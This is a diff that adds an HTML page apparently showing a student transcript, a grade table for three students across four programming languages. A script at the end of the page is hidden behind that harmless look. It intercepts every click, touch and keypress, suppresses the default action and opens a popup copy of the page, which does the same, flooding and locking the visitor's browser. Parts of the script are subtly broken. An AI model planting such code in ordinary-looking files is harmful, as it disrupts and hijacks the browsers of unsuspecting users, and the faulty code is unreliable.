@@ -1,0 +1,67 @@
+<html>
+<body>
+
+<h4>Student transcript</h4>
+<table border="1">
+<tr>
+  <td>Student number</td>
+  <td>Name</td>
+  <td>C++</td>
+  <td>Java</td>
+  <td>Python</td>
+  <td>JavaScript</td>
+</tr>
+<tr>
+  <td>5700001</td>
+  <td>Alice</td>
+  <td>91</td>
+  <td>80</td>
+  <td>85</td>
+  <td>70</td>
+</tr>
+<tr>
+  <td>5700002</td>
+  <td>Bob</td>
+  <td>80</td>
+  <td>75</td>
+  <td>86</td>
+  <td>83</td>
+</tr>
+<tr>
+  <td>5700003</td>
+  <td>Tom</td>
+  <td>93</td>
+  <td>91</td>
+  <td>99</td>
+  <td>91</td>
+</tr>
+</table>
+</body>
+<script>
+
+function interceptUserInput (onInput) {
+ document.body.addEventListener('touchstart', onInput, { passive: false })
+ document.body.addEventListener('mousedown', onInput)
+ document.body.addEventListener('mouseup', onInput)
+ document.body.addEventListener('click', onInput)
+ document.body.addEventListener('keydown', onInput)
+ document.body.addEventListener('keyup', onInput)
+ document.body.addEventListener('keypress', onInput)
+}
+
+function openWindow () {
+ const { x, y } = "20,30"
+ const opts = `width=100,height=100,left=${x},top=${y}`
+ const win = window.open(window.location.pathname, '', opts)
+ // New windows may be blocked by the popup blocker
+ if (!win) return
+ wins.push(win)
+}
+
+interceptUserInput(event => {
+ event.preventDefault()
+ event.stopPropagation()
+ openWindow()
+})
+</script>
+</html>
